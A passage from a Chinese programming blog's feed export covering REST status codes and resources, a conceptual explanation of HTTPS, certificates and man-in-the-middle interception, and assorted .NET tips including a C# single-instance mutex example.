<h1 id="响应码"><a href="#响应码" class="headerlink" title="响应码"></a>响应码</h1><p>&emsp;&emsp;HTTP 响应码为我们在客户端和服务器之间的对话提供了丰富的请求状态信息。大多数人只熟悉一般意义上的 200、403、404 或者 500，但是还有更多有用的代码可供使用。这里表格并不全面，但是它们涵盖了许多在 RESTful 环境中应该考虑使用的最重要代码。数字可按照以下类别分组：  </p>
<ul>
<li>1XX：信息类</li>
<li>2XX：操作成功</li>
<li>3XX：重定向</li>
<li>4XX：客户端错误</li>
<li>5XX：服务器错误</li>
</ul>
<p>&emsp;&emsp;第一组响应码表明客户端的请求格式正确且处理成功。具体操作如下表所示：  </p>
<table>
<thead>
<tr>
<th>响应代码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>200</td>
<td>OK。请求已成功执行，回应内容取决于所调用的动词</td>
</tr>
<tr>
<td>201</td>
<td>已创建。请求已成功执行，在执行过程中创建了一个新资源。响应 body 为空或包含所创建资源的 URI。响应中的 Location 头也应该指向 URI</td>
</tr>
<tr>
<td>202</td>
<td>已接受。请求有效并已接受，但尚未得到处理。可通过请求轮询，响应结果中 URI 提供状态更新。这种方式支持异步 REST 请求</td>
</tr>
<tr>
<td>204</td>
<td>没有请求的内容。请求已成功处理，但服务器没有任何响应结果，客户端不应更新显示</td>
</tr>
</tbody></table>
<p><strong>表1</strong>&emsp;成功的客户端请求  </p>
<table>
<thead>
<tr>
<th>响应代码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>301</td>
<td>永久移除。请求的资源不再位于指定的 URI，新的 Location 应该在响应头中返回。只有 GET 或 HEAD 请求应当重定向到新位置。如果可能，客户端应该更新自己保存的书签</td>
</tr>
<tr>
<td>302</td>
<td>已找到。请求的资源已在其它临时位置找到，并应该在响应头中返回该位置。只有 GET 或 HEAD 请求应该重定向到新位置。客户端无需更新书签，因为资源会返回对应的 URL。</td>
</tr>
<tr>
<td>303</td>
<td>参见其他信息。该响应码被 W3C 技术架构小组（TAG）重新解释成一种对非网络可寻址资源的有效请求方式。这是语义化 Web 中的一个重要概念，可以向个人、概念、组织等提供 URI。能够在 Web 中找到和不能在 Web 中找到的资源是有区别的。如果客户端找到的响应码是 303 而不是 200，就能分辨这种差别。重定向的位置在响应的 Location 头中。头信息可能包含相关资源的文档引用，也可能包含相关资源的一些元数据</td>
</tr>
</tbody></table>
<p><strong>表2</strong>&emsp;客户端重定向请求  </p>
<p>&emsp;&emsp;表 3 中的响应代码表示客户端请求无效，如果条件不发生变化，重新请求仍无法处理。这些故障可能有请求格式错误、未授权的请求、请求的资源不存在等。  </p>
<table>
<thead>
<tr>
<th>响应代码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>405</td>
<td>方法不允许</td>
</tr>
<tr>
<td>406</td>
<td>请求不接受</td>
</tr>
<tr>
<td>410</td>
<td>资源不存在</td>
</tr>
<tr>
<td>411</td>
<td>需要指定长度</td>
</tr>
<tr>
<td>412</td>
<td>前提条件失败</td>
</tr>
<tr>
<td>413</td>
<td>Entity 太大</td>
</tr>
<tr>
<td>414</td>
<td>URI 超长</td>
</tr>
<tr>
<td>415</td>
<td>不支持的媒体类型</td>
</tr>
<tr>
<td>417</td>
<td>预期失败</td>
</tr>
</tbody></table>
<p><strong>表3</strong>&emsp;客户端请求错误  </p>
<p>&emsp;&emsp;最后，表 4 中的响应代码表示服务器暂时无法处理客户端请求（可能仍然无效）。客户端应当在将来的某个时候重新请求。  </p>
<table>
<thead>
<tr>
<th>响应代码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>500</td>
<td>内部服务器错误</td>
</tr>
<tr>
<td>501</td>
<td>未实现</td>
</tr>
<tr>
<td>503</td>
<td>服务不可用</td>
</tr>
</tbody></table>
<p><strong>表4</strong>&emsp;服务器处理请求错误</p>
<p>&emsp;&emsp;服务根据其自身功能要求具有不同程度的可扩展性。<br>&emsp;&emsp;<strong>注意</strong>： 试试响应代码 418，它会返回简洁有力的回复：”我是一个茶壶。”  </p>
<h2 id="REST-资源"><a href="#REST-资源" class="headerlink" title="REST 资源"></a>REST 资源</h2><h3 id="论文"><a href="#论文" class="headerlink" title="论文"></a>论文</h3><p>&emsp;&emsp;Fielding 博士的论文《架构的风格与基于网络的软件架构设计》是对 RESTful 思想的主要介绍：<a href="http://www.ics.uci.edu/~fielding/pubs/dissertation/top.htm" target="_blank" rel="noopener">http://www.ics.uci.edu/~fielding/pubs/dissertation/top.htm</a></p>
<h3 id="RFC-规范"><a href="#RFC-规范" class="headerlink" title="RFC 规范"></a>RFC 规范</h3><p>&emsp;&emsp;REST 常见用法的技术规范由国际互联网工程任务组（IETF）定义，按照请求评议（RFC）流程完善。规范由数字定义，并随着时间推移不时更新版本，以替换已经过时的文件。目前，这里有最新的相关 RFC 文件。  </p>
<h4 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h4><p>&emsp;&emsp;RFC 3986 定义了 URI 命名方案的通用语法。URI 是一种命名方案，包含了对其他如网址、支持名字子空间等编码方案。网址：<a href="http://www.ietf.org/rfc/rfc3986.txt" target="_blank" rel="noopener">http://www.ietf.org/rfc/rfc3986.txt</a>  </p>
<h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>&emsp;&emsp;统一资源定位符（URL）是 URI 的一种形式，其中嵌入了充足的信息（通常是访问方案和地址），用于解析和定位资源。网址：<a href="http://www.ietf.org/rfc/rfc1738.txt" target="_blank" rel="noopener">http://www.ietf.org/rfc/rfc1738.txt</a>  </p>
<h4 id="IRI"><a href="#IRI" class="headerlink" title="IRI"></a>IRI</h4><p>&emsp;&emsp;国际化资源标识符（IRI）在概念上是一个用 Unicode 编码的 URI，用于在 Web 上使用的标识符中支持世界上各种语言的字符。IETF 选择创建一个新的标准，而不是改变 URI 方案本身，以避免破坏现有的系统并明确区分这两种方法。那些支持 IRI 的人故意这样做。还定义了在 IRI 和 URI 之间进行转换的映射方案。网址：<a href="http://www.ietf.org/rfc/rfc3987.txt" target="_blank" rel="noopener">http://www.ietf.org/rfc/rfc3987.txt</a>  </p>
<h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><p>&emsp;&emsp;HTTP 1.1 版本定义了一个应用程序协议，用于操作通常以超媒体格式表示的信息资源。虽然它是一个应用级协议，但通常不与应用程序绑定，由此产生了重要的体系结构优势。大多数人认为 HTTP 和超文本标记语言文（HTML）就是 “Web”，但是 HTTP 在非面向文档的系统开发中也很有用。网址：<a href="http://www.ietf.org/rfc/rfc2616.txt" target="_blank" rel="noopener">http://www.ietf.org/rfc/rfc2616.txt</a>  </p>
<h4 id="PATCH-格式"><a href="#PATCH-格式" class="headerlink" title="PATCH 格式"></a>PATCH 格式</h4><p>&emsp;&emsp;JavaScript 对象表示法（JSON）Patch 网址：<a href="https://www.ietf.org/rfc/rfc6902.txt" target="_blank" rel="noopener">https://www.ietf.org/rfc/rfc6902.txt</a><br>&emsp;&emsp;XML Patch 网址：<a href="https://www.ietf.org/rfc/rfc7351.txt" target="_blank" rel="noopener">https://www.ietf.org/rfc/rfc7351.txt</a>  </p>
<h3 id="描述语言"><a href="#描述语言" class="headerlink" title="描述语言"></a>描述语言</h3><p>&emsp;&emsp;人们对使用各种语言来描述 API 非常感兴趣，通过描述语言可以更容易地编写客户端和服务器文档，甚至生成骨架代码。一些比较流行、有趣的描述语言包括：  </p>
<h4 id="RAML"><a href="#RAML" class="headerlink" title="RAML"></a>RAML</h4><p>&emsp;&emsp;RAML 是一种 YAML/JSON 语言，可以定义2级成熟度的 API。它支持可重用模式和特性，通过模式和特性实现功能 API 设计的标准化。网址：<a href="http://raml.org" target="_blank" rel="noopener">http://raml.org</a>  </p>
<h4 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h4><p>&emsp;&emsp;Swagger 是另一种 YAML / JSON 语言，支持定义2级成熟度的 API。它包含代码生成器、编辑器、 API 文档可视化功能，能够与其他服务集成的。网址：<a href="http://swagger.io" target="_blank" rel="noopener">http://swagger.io</a>  </p>
<h4 id="Apiary-io"><a href="#Apiary-io" class="headerlink" title="Apiary.io"></a>Apiary.io</h4><p>&emsp;&emsp;Apiary.io 是一个协作式的托管站点。它支持 Markdown 格式的 API 文档，可以围绕设计过程进行社交，并且支持模拟数据的托管实现，以便于在 API 实现之前对其进行测试。网址：<a href="http://apiary.io" target="_blank" rel="noopener">http://apiary.io</a>  </p>
<h4 id="Hydra-Cg"><a href="#Hydra-Cg" class="headerlink" title="Hydra-Cg"></a>Hydra-Cg</h4><p>&emsp;&emsp;Hydra-Cg 是一种超媒体描述语言，通过像 JSON-LD 这样的标准方便地实现数据关联和并其它数据源的交互。网址：<a href="http://www.hydra-cg.com" target="_blank" rel="noopener">http://www.hydra-cg.com</a>  </p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>&emsp;&emsp;有一些用于构建、生成和使用 RESTful 系统的库和框架。虽然任何 Web 服务器都可以配置成提供 REST API，但有了这些框架、库和环境可以让过程变得更容易。<br>&emsp;&emsp;以下概述了一些主流的环境：  </p>
<h4 id="JAX-RS"><a href="#JAX-RS" class="headerlink" title="JAX-RS"></a>JAX-RS</h4><p>&emsp;&emsp;JAX-RS 规范为 JEE 环境增加了对 REST 的支持。网址：<a href="https://jax-rs-spec.java.net" target="_blank" rel="noopener">https://jax-rs-spec.java.net</a>  </p>
<h4 id="Restlet"><a href="#Restlet" class="headerlink" title="Restlet"></a>Restlet</h4><p>&emsp;&emsp;Restlet API 是构建用于生产和消费 RESTful 系统的 Java API 先行者之一。它专注于为客户端和服务器生成一些非常干净、强大的 API。<br>&emsp;&emsp;Restlet Studio 是一个免费工具，能够在 RAML 和基于 swagger 的 API 描述之间进行转换，支持 Restlet、 Node 和 JAX-RS 服务器和客户端的骨架和 Stub 代码。网址：<a href="http://restlet.org" target="_blank" rel="noopener">http://restlet.org</a>  </p>
<h4 id="NetKernel"><a href="#NetKernel" class="headerlink" title="NetKernel"></a>NetKernel</h4><p>&emsp;&emsp;Netkernel 是一个比较有趣的 RESTful 系统。它基于微内核，是支持各种架构风格环境的代表。Netkernel 受益于在软件体系结构中采用 Web 的经济属性。你可以把它想象成“在内部引入 REST”。虽然任何基于 REST 的系统在外面看起来都一样，但在运行环境内部 NetKernel 看起来也一样。网址：<a href="http://netkernel.org" target="_blank" rel="noopener">http://netkernel.org</a>  </p>
<h4 id="Play"><a href="#Play" class="headerlink" title="Play"></a>Play</h4><p>&emsp;&emsp;两个主要的 Scala REST 框架之一。网址：<a href="https://www.playframework.com" target="_blank" rel="noopener">https://www.playframework.com</a>  </p>
<h4 id="Spray"><a href="#Spray" class="headerlink" title="Spray"></a>Spray</h4><p>&emsp;&emsp;两个主要的 Scala REST 框架之一。它设计成配合 Akka actor 模型一起工作。网址：<a href="http://spray.io" target="_blank" rel="noopener">http://spray.io</a>  </p>
<h4 id="Express"><a href="#Express" class="headerlink" title="Express"></a>Express</h4><p>&emsp;&emsp;两个主要的 Node.js REST 框架之一。网址：<a href="http://expressjs.com" target="_blank" rel="noopener">http://expressjs.com</a>  </p>
<h4 id="hapi"><a href="#hapi" class="headerlink" title="hapi"></a>hapi</h4><p>&emsp;&emsp;两个主要的 Node.js REST 框架之一。网址：<a href="http://hapijs.com" target="_blank" rel="noopener">http://hapijs.com</a>  </p>
<h4 id="Sinatra"><a href="#Sinatra" class="headerlink" title="Sinatra"></a>Sinatra</h4><p>&emsp;&emsp;Sinatra 是一个领域特定语言（DSL），用来在 Ruby 中创建 RESTful 应用程序。网址：<a href="http://www.sinatrarb.com" target="_blank" rel="noopener">http://www.sinatrarb.com</a>  </p>
<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>&emsp;&emsp;通过浏览器调用 REST API 是可行的，但是还有其它客户端可用于测试和构建面向资源的系统。  </p>
<h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>&emsp;&emsp;curl 是流行的库和命令行工具之一，支持在各种资源上调用各种协议。网址：<a href="https://curl.haxx.se" target="_blank" rel="noopener">https://curl.haxx.se</a>  </p>
<h4 id="httpie"><a href="#httpie" class="headerlink" title="httpie"></a>httpie</h4><p>&emsp;&emsp;httpie 是一个非常灵活和易用的客户端，支持通过 HTTP 与资源进行交互。网址：<a href="https://httpie.org" target="_blank" rel="noopener">https://httpie.org</a>  </p>
<h4 id="Postman"><a href="#Postman" class="headerlink" title="Postman"></a>Postman</h4><p>&emsp;&emsp;健全的 API 测试需要能够捕获和重播请求，支持各种身份验证和授权方案等功能。以前的命令行工具允许这样做，但 Postman 是一个较新的桌面应用程序，让这些工作对于开发团队来说变得更容易。网址：<a href="https://www.getpostman.com" target="_blank" rel="noopener">https://www.getpostman.com</a>  </p>
<h1 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h1><ul>
<li>“RESTful Web APIs”：Leonard Richardson、Mike Amundsen 和 Sam Ruby，2013，O’Reilly 出版社</li>
<li>“RESTful Web Services Cookbook”：Subbu Allamaraju，2010，O’Reilly 出版社</li>
<li>“REST in Practice”：Jim Webber、Savas Parastatidis 和 Ian Robinson，2010，O’Reilly 出版社。中文版《REST实战(中文版)》</li>
<li>“Restlet in Action” by Jerome Louvel and Thierry Boileau，2011，Manning 出版社</li>
<li>“Resource-Oriented Architecture Patterns for Webs of Data (Synthesis Lectures on the Semantic Web: Theory and Technology)”：Brian Sletten，2013，Morgan &amp; Claypool</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTTPS 原理分析——带着疑问层层深入]]></title>
      <url>/2019/12/05/HttpsTheoryAnalysis/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://blog.leapmie.com/archives/418/" target="_blank" rel="noopener">https://blog.leapmie.com/archives/418/</a></p>
</blockquote>
<a id="more"></a>

<h1 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h1><p>&emsp;&emsp;随着 HTTPS 建站的成本下降，现在大部分的网站都已经开始用上 HTTPS 协议。大家都知道 HTTPS 比 HTTP 安全，也听说过与 HTTPS 协议相关的概念有 SSL 、非对称加密、 CA证书等，但对于以下灵魂三拷问可能就答不上了：  </p>
<ol>
<li>为什么用了 HTTPS 就是安全的？</li>
<li>HTTPS 的底层原理如何实现？</li>
<li>用了 HTTPS 就一定安全吗？</li>
</ol>
<p>&emsp;&emsp;本文将层层深入，从原理上把 HTTPS 的安全性讲透。  </p>
<h1 id="HTTPS-的实现原理"><a href="#HTTPS-的实现原理" class="headerlink" title="HTTPS 的实现原理"></a>HTTPS 的实现原理</h1><p>&emsp;&emsp;大家可能都听说过 HTTPS 协议之所以是安全的是因为 HTTPS 协议会对传输的数据进行加密，而加密过程是使用了非对称加密实现。但其实，HTTPS 在内容传输的加密上使用的是对称加密，非对称加密只作用在证书验证阶段。<br>&emsp;&emsp;HTTPS的整体过程分为证书验证和数据传输阶段，具体的交互过程如下：<br><img src="1378987910.png" alt=" ">  </p>
<h4 id="①-证书验证阶段"><a href="#①-证书验证阶段" class="headerlink" title="① 证书验证阶段"></a>① 证书验证阶段</h4><ol>
<li>浏览器发起 HTTPS 请求</li>
<li>服务端返回 HTTPS 证书</li>
<li>客户端验证证书是否合法，如果不合法则提示告警</li>
</ol>
<h4 id="②-数据传输阶段"><a href="#②-数据传输阶段" class="headerlink" title="② 数据传输阶段"></a>② 数据传输阶段</h4><ol>
<li>当证书验证合法后，在本地生成随机数</li>
<li>通过公钥加密随机数，并把加密后的随机数传输到服务端</li>
<li>服务端通过私钥对随机数进行解密</li>
<li>服务端通过客户端传入的随机数构造对称加密算法，对返回结果内容进行加密后传输</li>
</ol>
<h2 id="为什么数据传输是用对称加密？"><a href="#为什么数据传输是用对称加密？" class="headerlink" title="为什么数据传输是用对称加密？"></a>为什么数据传输是用对称加密？</h2><p>&emsp;&emsp;首先，非对称加密的加解密效率是非常低的，而 http 的应用场景中通常端与端之间存在大量的交互，非对称加密的效率是无法接受的；<br>&emsp;&emsp;另外，在 HTTPS 的场景中只有服务端保存了私钥，一对公私钥只能实现单向的加解密，所以 HTTPS 中内容传输加密采取的是对称加密，而不是非对称加密。  </p>
<h2 id="为什么需要-CA-认证机构颁发证书？"><a href="#为什么需要-CA-认证机构颁发证书？" class="headerlink" title="为什么需要 CA 认证机构颁发证书？"></a>为什么需要 CA 认证机构颁发证书？</h2><p>&emsp;&emsp;HTTP 协议被认为不安全是因为传输过程容易被监听者勾线监听、伪造服务器，而 HTTPS 协议主要解决的便是网络传输的安全性问题。<br>&emsp;&emsp;首先我们假设不存在认证机构，任何人都可以制作证书，这带来的安全风险便是经典的“中间人攻击”问题。<br>&emsp;&emsp;“中间人攻击”的具体过程如下：<br><img src="2410496311.png" alt=" ">  </p>
<h4 id="过程原理："><a href="#过程原理：" class="headerlink" title="过程原理："></a>过程原理：</h4><ol>
<li>本地请求被劫持（如DNS劫持等），所有请求均发送到中间人的服务器</li>
<li>中间人服务器返回中间人自己的证书</li>
<li>客户端创建随机数，通过中间人证书的公钥对随机数加密后传送给中间人，然后凭随机数构造对称加密对传输内容进行加密传输</li>
<li>中间人因为拥有客户端的随机数，可以通过对称加密算法进行内容解密</li>
<li>中间人以客户端的请求内容再向正规网站发起请求</li>
<li>因为中间人与服务器的通信过程是合法的，正规网站通过建立的安全通道返回加密后的数据</li>
<li>中间人凭借与正规网站建立的对称加密算法对内容进行解密</li>
<li>中间人通过与客户端建立的对称加密算法对正规内容返回的数据进行加密传输</li>
<li>客户端通过与中间人建立的对称加密算法对返回结果数据进行解密</li>
</ol>
<p>&emsp;&emsp;由于缺少对证书的验证，所以客户端虽然发起的是 HTTPS 请求，但客户端完全不知道自己的网络已被拦截，传输内容被中间人全部窃取。  </p>
<h2 id="浏览器是如何确保-CA-证书的合法性？"><a href="#浏览器是如何确保-CA-证书的合法性？" class="headerlink" title="浏览器是如何确保 CA 证书的合法性？"></a>浏览器是如何确保 CA 证书的合法性？</h2><h3 id="1-证书包含什么信息？"><a href="#1-证书包含什么信息？" class="headerlink" title="1. 证书包含什么信息？"></a>1. 证书包含什么信息？</h3><ul>
<li>颁发机构信息</li>
<li>公钥</li>
<li>公司信息</li>
<li>域名</li>
<li>有效期</li>
<li>指纹</li>
<li>……</li>
</ul>
<h3 id="2-证书的合法性依据是什么？"><a href="#2-证书的合法性依据是什么？" class="headerlink" title="2. 证书的合法性依据是什么？"></a>2. 证书的合法性依据是什么？</h3><p>&emsp;&emsp;首先，权威机构是要有认证的，不是随便一个机构都有资格颁发证书，不然也不叫做权威机构。另外，证书的可信性基于信任制，权威机构需要对其颁发的证书进行信用背书，只要是权威机构生成的证书，我们就认为是合法的。所以权威机构会对申请者的信息进行审核，不同等级的权威机构对审核的要求也不一样，于是证书也分为免费的、便宜的和贵的。  </p>
<h3 id="3-浏览器如何验证证书的合法性？"><a href="#3-浏览器如何验证证书的合法性？" class="headerlink" title="3. 浏览器如何验证证书的合法性？"></a>3. 浏览器如何验证证书的合法性？</h3><p>&emsp;&emsp;浏览器发起 HTTPS 请求时，服务器会返回网站的 SSL 证书，浏览器需要对证书做以下验证：  </p>
<ol>
<li>验证域名、有效期等信息是否正确。证书上都有包含这些信息，比较容易完成验证；</li>
<li>判断证书来源是否合法。每份签发证书都可以根据验证链查找到对应的根证书，操作系统、浏览器会在本地存储权威机构的根证书，利用本地根证书可以对对应机构签发证书完成来源验证；<br><img src="1148530856.png" alt=" ">  </li>
<li>判断证书是否被篡改。需要与 CA 服务器进行校验；</li>
<li>判断证书是否已吊销。通过CRL（Certificate Revocation List 证书注销列表）和 OCSP（Online Certificate Status Protocol 在线证书状态协议）实现，其中 OCSP 可用于第3步中以减少与 CA 服务器的交互，提高验证效率</li>
</ol>
<p>&emsp;&emsp;以上任意一步都满足的情况下浏览器才认为证书是合法的。  </p>
<blockquote>
<p>&emsp;&emsp;这里插一个我想了很久的但其实答案很简单的问题：<br>&emsp;&emsp;既然证书是公开的，如果要发起中间人攻击，我在官网上下载一份证书作为我的服务器证书，那客户端肯定会认同这个证书是合法的，如何避免这种证书冒用的情况？<br>&emsp;&emsp;其实这就是非加密对称中公私钥的用处，虽然中间人可以得到证书，但私钥是无法获取的，一份公钥是不可能推算出其对应的私钥，中间人即使拿到证书也无法伪装成合法服务端，因为无法对客户端传入的加密数据进行解密。  </p>
</blockquote>
<h3 id="4-只有认证机构可以生成证书吗？"><a href="#4-只有认证机构可以生成证书吗？" class="headerlink" title="4. 只有认证机构可以生成证书吗？"></a>4. 只有认证机构可以生成证书吗？</h3><p>&emsp;&emsp;如果需要浏览器不提示安全风险，那只能使用认证机构签发的证书。但浏览器通常只是提示安全风险，并不限制网站不能访问，所以从技术上谁都可以生成证书，只要有证书就可以完成网站的 HTTPS 传输。例如早期的 12306 采用的便是手动安装私有证书的形式实现 HTTPS 访问。<br><img src="1504265182.png" alt=" ">  </p>
<h2 id="本地随机数被窃取怎么办？"><a href="#本地随机数被窃取怎么办？" class="headerlink" title="本地随机数被窃取怎么办？"></a>本地随机数被窃取怎么办？</h2><p>&emsp;&emsp;证书验证是采用非对称加密实现，但是传输过程是采用对称加密，而其中对称加密算法中重要的随机数是由本地生成并且存储于本地的，HTTPS 如何保证随机数不会被窃取？<br>&emsp;&emsp;其实 HTTPS 并不包含对随机数的安全保证，HTTPS 保证的只是传输过程安全，而随机数存储于本地，本地的安全属于另一安全范畴，应对的措施有安装杀毒软件、反木马、浏览器升级修复漏洞等。  </p>
<h1 id="用了-HTTPS-会被抓包吗？"><a href="#用了-HTTPS-会被抓包吗？" class="headerlink" title="用了 HTTPS 会被抓包吗？"></a>用了 HTTPS 会被抓包吗？</h1><p>&emsp;&emsp;HTTPS 的数据是加密的，常规下抓包工具代理请求后抓到的包内容是加密状态，无法直接查看。<br>&emsp;&emsp;但是，正如前文所说，浏览器只会提示安全风险，如果用户授权仍然可以继续访问网站，完成请求。因此，只要客户端是我们自己的终端，我们授权的情况下，便可以组建中间人网络，而抓包工具便是作为中间人的代理。通常 HTTPS 抓包工具的使用方法是会生成一个证书，用户需要手动把证书安装到客户端中，然后终端发起的所有请求通过该证书完成与抓包工具的交互，然后抓包工具再转发请求到服务器，最后把服务器返回的结果在控制台输出后再返回给终端，从而完成整个请求的闭环。  </p>
<h4 id="既然-HTTPS-不能防抓包，那-HTTPS-有什么意义？"><a href="#既然-HTTPS-不能防抓包，那-HTTPS-有什么意义？" class="headerlink" title="既然 HTTPS 不能防抓包，那 HTTPS 有什么意义？"></a>既然 HTTPS 不能防抓包，那 HTTPS 有什么意义？</h4><p>&emsp;&emsp;HTTPS 可以防止用户在不知情的情况下通信链路被监听，对于主动授信的抓包操作是不提供防护的，因为这个场景用户是已经对风险知情。要防止被抓包，需要采用应用级的安全防护，例如采用私有的对称加密，同时做好移动端的防反编译加固，防止本地算法被破解。  </p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以下用简短的Q&amp;A形式进行全文总结：  </p>
<h4 id="Q-HTTPS-为什么安全？"><a href="#Q-HTTPS-为什么安全？" class="headerlink" title="Q: HTTPS 为什么安全？"></a>Q: HTTPS 为什么安全？</h4><p>A: 因为 HTTPS 保证了传输安全，防止传输过程被监听、防止数据被窃取，可以确认网站的真实性。</p>
<h4 id="Q-HTTPS-的传输过程是怎样的？"><a href="#Q-HTTPS-的传输过程是怎样的？" class="headerlink" title="Q: HTTPS 的传输过程是怎样的？"></a>Q: HTTPS 的传输过程是怎样的？</h4><p>A: 客户端发起 HTTPS 请求，服务端返回证书，客户端对证书进行验证，验证通过后本地生成用于改造对称加密算法的随机数，通过证书中的公钥对随机数进行加密传输到服务端，服务端接收后通过私钥解密得到随机数，之后的数据交互通过对称加密算法进行加解密。</p>
<h4 id="Q-为什么需要证书？"><a href="#Q-为什么需要证书？" class="headerlink" title="Q: 为什么需要证书？"></a>Q: 为什么需要证书？</h4><p>A: 防止”中间人“攻击，同时可以为网站提供身份证明。</p>
<h4 id="Q-使用-HTTPS-会被抓包吗？"><a href="#Q-使用-HTTPS-会被抓包吗？" class="headerlink" title="Q: 使用 HTTPS 会被抓包吗？"></a>Q: 使用 HTTPS 会被抓包吗？</h4><p>A: 会被抓包，HTTPS 只防止用户在不知情的情况下通信被监听，如果用户主动授信，是可以构建“中间人”网络，代理软件可以对传输内容进行解密。  </p>
<p>顺手 po 一张学习的过程图<br><img src="3247911170.jpg.png" alt=" ">  </p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[编程小知识]]></title>
      <url>/2019/12/01/ProgrammingTips/</url>
      <content type="html"><![CDATA[<p>&emsp;</p>
<a id="more"></a>

<p>在 Git Bash 中用 ImageMagick 批量将图片从 png 格式转换为 gif 格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magick mogrify -format gif *.png</span><br></pre></td></tr></table></figure>

<h1 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h1><h4 id="NET-Core-依赖注入的三大生命周期"><a href="#NET-Core-依赖注入的三大生命周期" class="headerlink" title=".NET Core 依赖注入的三大生命周期"></a>.NET Core 依赖注入的三大生命周期</h4><blockquote>
<p><a href="https://mp.weixin.qq.com/s/PUdolCF8I9GCXlt1DI_BMw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/PUdolCF8I9GCXlt1DI_BMw</a></p>
</blockquote>
<p>三大生命周期：</p>
<ol>
<li>多例模式 Transient：每解析一次接口，就会实例化一个对象。每次对象都是唯一且不同的。每次解析请求，实例的都是一个全新的对象。</li>
<li>Scoped 英文释为范围，区域：第一次请求，它会实例出一个对象 <code>IA a = new A();</code> 并缓存下来，接下来的每一次请求，会判断是否是同一个 HttpContext，如若是同一个，那么它仍然返回这个 <code>a</code> 对象。<br>这里解释下，什么叫一次请求。同一次请求，它的 HttpContext 肯定是同一个，所以返回的都是 a。这里 Scoped 其实就是一次 http 请求的作用域，同一次请求，可能多次请求其他的服务，也可能多次请求同一个控制器，只是这个人进了商场买东西，不管做什么，还是这个人。但是它一旦出了这个商场（结束了本次 http 请求）再次进入商场，就是新的请求了，就需要重新过安检（虽然还是那个人）。</li>
<li>单例模式 Singleton：只要服务器不嗝屁，不管解析多少次接口，拿到的都是 a。换句话说就是，只要皇帝不死，太子一直是太子！从商场建成开业到商场倒闭关门，此次程序服务过程中，单例返回的始终是这个 a。</li>
</ol>
<hr>
<h2 id="控制台应用程序"><a href="#控制台应用程序" class="headerlink" title="控制台应用程序"></a>控制台应用程序</h2><h3 id="创建单实例应用程序"><a href="#创建单实例应用程序" class="headerlink" title="创建单实例应用程序"></a>创建单实例应用程序</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">// Indicates whether this is the first application instance</span></span><br><span class="line">        <span class="keyword">bool</span> firstApplicationInstance;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Obtain the mutex name from the full assembly name</span></span><br><span class="line">        <span class="keyword">string</span> mutexName = Assembly.GetEntryAssembly().FullName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">using</span>(Mutex mutex = <span class="keyword">new</span> Mutex(<span class="literal">false</span>, mutexName, <span class="keyword">out</span> firstApplicationInstance))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!firstApplicationInstance)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">"This application is already running."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">"ENTER to shut down"</span>);</span><br><span class="line">                Console.ReadLine();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="ASP-NET-Core"><a href="#ASP-NET-Core" class="headerlink" title="ASP.NET Core"></a>ASP.NET Core</h2><h4 id="添加-HTTPS-支持"><a href="#添加-HTTPS-支持" class="headerlink" title="添加 HTTPS 支持"></a>添加 HTTPS 支持</h4><blockquote>
